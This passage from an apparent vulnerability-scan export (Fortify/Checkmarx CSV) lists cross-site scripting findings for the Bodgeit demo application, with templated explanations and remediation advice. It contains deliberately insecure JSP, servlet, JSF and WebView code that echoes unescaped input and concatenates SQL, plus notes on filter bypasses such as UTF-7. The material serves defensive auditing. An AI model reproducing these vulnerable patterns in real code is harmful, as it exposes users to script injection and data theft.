employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","192","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/password.jsp","username","","http://localhost/root/password.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","212","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/product.jsp","","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include 